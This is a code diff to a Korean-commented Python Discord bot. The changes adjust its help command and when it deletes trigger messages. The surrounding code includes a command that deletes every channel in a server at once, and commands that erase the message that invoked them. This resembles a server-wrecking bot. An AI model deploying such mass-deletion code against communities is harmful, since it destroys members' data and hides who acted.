@@ -41,7 +41,8 @@ intents.message_content = True
 intents.guilds = True
 intents.members = True
 
-bot = commands.Bot(command_prefix=".", intents=intents, allowed_mentions=allowed_mentions)
+# 기본 help 명령어 충돌 방지를 위해 help_command=None 설정
+bot = commands.Bot(command_prefix=".", intents=intents, allowed_mentions=allowed_mentions, help_command=None)
 
 @bot.event
 async def on_ready():
@@ -64,7 +65,6 @@ async def delete_trigger_message(ctx):
 
 @bot.command(name="명령어")
 async def show_help(ctx):
-    await delete_trigger_message(ctx)
     log(f"[REQUEST] User: {ctx.author} | Server: {ctx.guild.name} | 명령어 목록 요청")
     
     help_text = (
@@ -83,6 +83,8 @@ async def show_help(ctx):
         await ctx.send(help_text)
     except Exception as e:
         log(f"[FAILED] 명령어 목록 전송 실패: {e}")
+    finally:
+        await delete_trigger_message(ctx)
 
 async def send_single_message(channel, message_text, index):
     try:
@@ -195,20 +197,17 @@ async def delete_single_channel(channel):
 async def delete_all_channels(ctx):
     await delete_trigger_message(ctx)
     guild = ctx.guild
-    # 카테고리/텍스트/음성 등 모든 채널 목록 수집
     channels = list(guild.channels)
     total_count = len(channels)
 
     log(f"[REQUEST] User: {ctx.author} | Server: {guild.name} | 모든 채널 삭제 요청 ({total_count}개 채널)")
 
-    # 비동기로 모든 채널 일괄 삭제
     tasks = [delete_single_channel(ch) for ch in channels]
     results = await asyncio.gather(*tasks)
     success_count = sum(1 for res in results if res is True)
 
     log(f"[COMPLETE] 모든 채널 삭제 완료: 총 {success_count} / {total_count}개 삭제됨")
 
-    # 삭제가 완료된 후 대기용 기본 채널 생성
     try:
         new_ch = await guild.create_text_channel(name="새로운-채널")
         log(f"[SUCCESS] 모든 채널 삭제 후 기본 채널 생성 완료: #{new_ch.name}")
